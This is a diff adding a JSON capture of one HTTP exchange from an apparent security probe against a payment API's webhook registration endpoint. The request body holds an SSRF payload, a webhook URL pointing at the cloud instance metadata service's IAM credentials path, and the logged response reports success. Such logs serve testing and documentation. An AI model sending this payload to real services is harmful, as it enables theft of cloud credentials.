@@ -1,0 +1,31 @@
+{
+  "captured_at": "2026-05-28T02:28:46.786947+00:00",
+  "attempt_id": "P1-ssrf-delivery-confirm",
+  "elapsed_ms": 525.86,
+  "outcome": "success",
+  "request": {
+    "method": "POST",
+    "url": "https://api.balampay.com/webhooks/register",
+    "headers": {
+      "Content-Type": "application/json",
+      "x-api-key": "REDACTED(40)",
+      "Authorization": "REDACTED(872)"
+    },
+    "body": {
+      "webhook_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "client_uuid": "<client_id-redacted>",
+      "secret": "REDACTED(32)"
+    }
+  },
+  "response": {
+    "status": 200,
+    "headers": {
+      "content-type": "application/json",
+      "x-amzn-requestid": "1f7c7f01-250f-48ec-85ea-04e4c290b96a"
+    },
+    "body": {
+      "message": "Webhook registered successfully"
+    }
+  },
+  "context": "Probe 1 — SSRF delivery confirmation. Step=stepD-register-imds"
+}
